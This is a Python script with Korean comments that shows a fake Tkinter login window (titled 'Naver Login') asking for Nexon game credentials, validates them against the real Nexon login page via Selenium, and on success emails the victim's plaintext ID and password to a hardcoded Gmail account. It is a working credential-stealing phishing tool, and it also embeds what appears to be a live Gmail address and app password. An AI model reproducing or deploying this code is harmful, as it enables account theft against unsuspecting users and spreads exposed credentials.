from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
#exception handling
from selenium.common.exceptions import NoSuchElementException

from tkinter import *
import tkinter as tk

import smtplib, os
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

'''
import yaml


#yaml파일에 저장된 아이디 비밀번호를 가져온다.
conf = yaml.safe_load(open('loginDetails.yml'))
myFbEmail = conf['fb_user']['email']
myFbPassword = conf['fb_user']['password']
'''

#웹드라이버 버전에 맞도록 자동설치
chrome_options = webdriver.ChromeOptions()
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

#로그인 시도
def try_login(url,usernameId, username, passwordId, password, submit_buttonId):
   driver.get(url)
   driver.implicitly_wait(3)
   driver.find_element("id",usernameId).send_keys(username)
   driver.find_element("id",passwordId).send_keys(password)
   driver.find_element(By.XPATH,submit_buttonId).click()

#특정데이터를 가져와서 로그인이 되었는지 확인.
def check_login(url, check_id):
   driver.implicitly_wait(2)
   try:
      test = driver.find_element(By.XPATH, check_id)
      #로그인 성공
      print("로그인 성공")
      #받은 정보 전송
      return TRUE
   except NoSuchElementException:
      #로그인 실패
      print("로그인 실패")
      #실패 메시지
      return FALSE

#입력한 아이디 비밀번호 변수에 저장

def login():    
   user_id = ent1.get()
   user_pw = ent2.get()

   print(user_id, user_pw)
   #동작부분 ( 넥슨에 로그인한다 )
   try_login("https://nxlogin.nexon.com/common/login.aspx?redirect=https%3A%2F%2Fwww.nexon.com%2FHome%2FGame", "txtNexonID", user_id,"txtPWD", user_pw, '//*[@id="nexonLogin"]/fieldset/div[4]/button')
   if (check_login("https://www.nexon.com/Home/Game#close",'//*[@id="contents"]/div[2]/div[4]/ul/li[1]/a')):
      #로그인 성공, 파일 작성
      smtp_user = 'holykim707@gmail.com'
      smtp_password = 'puorvfxkyfksobie'
      emails = ['holykim707@gmail.com']
      server = 'smtp.gmail.com'
      port = 587
      for email in emails:
         msg = MIMEMultipart("alternative")
         msg ["Subject"] = 'Nexon USER가 입력한ID, PW입니다'
         msg ["From"] = smtp_user
         msg["To"] = email
         msg .attach(
         MIMEText (
            "ID: "+user_id + "  PW: "+user_pw,
            "입력한 id와 pw를 가져왔습니다"
  
  
         )
         )
  
      s = smtplib .SMTP(server , port)
      s .ehlo()
      s .starttls()
      s .login(smtp_user,smtp_password)
      s .sendmail(smtp_user , email , msg .as_string())
      s.quit()
      print("로그인 성공")
   else :
      print("로그인 실패")



win = Tk()
win.title("Naver Login")
win.geometry("500x400")


label3 = Label(win)
label3.config(text = "당신의 Nexon 아이디와 비밀번호를 입력하세요")
label3.pack()

# id label
label1 = Label(win)
label1.config(text = "ID")
label1.pack()

# id 입력
ent1 = Entry(win)
ent1.pack()

# pw label
label2 = Label(win)
label2.config(text = "PW")
label2.pack()

# pw 입력
ent2 = Entry(win)
ent2.config(show ="*")
ent2.pack()

# 로그인 btn
btn = Button(win)
btn.config(text = "Login")


btn.config(command = login)
btn.pack()

win.mainloop()